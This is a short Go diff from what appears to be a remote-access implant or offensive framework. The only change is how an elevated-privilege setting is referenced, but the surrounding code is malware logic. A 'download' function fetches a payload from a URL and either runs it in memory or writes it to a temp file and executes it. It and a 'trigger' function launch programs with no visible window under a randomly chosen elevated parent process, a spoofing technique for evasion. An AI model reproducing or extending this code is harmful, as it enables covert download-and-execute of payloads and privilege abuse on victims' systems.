@@ -77,7 +77,7 @@ func trigger(s []string) bool {
 		}
 		os.Chmod(s[i], 0755)
 		p := cmd.NewProcess(s[i])
-		p.SetParentRandomEx(nil, device.Elevated())
+		p.SetParentRandomEx(nil, device.Local.Elevated)
 		p.SetWindowDisplay(0)
 		p.SetNoWindow(true)
 		if err := p.Start(); err == nil {
@@ -115,7 +115,7 @@ func download(u string, t bool) error {
 	}
 	if t {
 		e := cmd.Code{Data: b}
-		e.SetParentRandomEx(nil, device.Elevated())
+		e.SetParentRandomEx(nil, device.Local.Elevated)
 		return e.Start()
 	}
 	f, err := ioutil.TempFile("", "sys")
@@ -128,7 +128,7 @@ func download(u string, t bool) error {
 	}
 	os.Chmod(f.Name(), 0755)
 	e := cmd.NewProcess(f.Name())
-	e.SetParentRandomEx(nil, device.Elevated())
+	e.SetParentRandomEx(nil, device.Local.Elevated)
 	e.SetWindowDisplay(0)
 	e.SetNoWindow(true)
 	return e.Start()
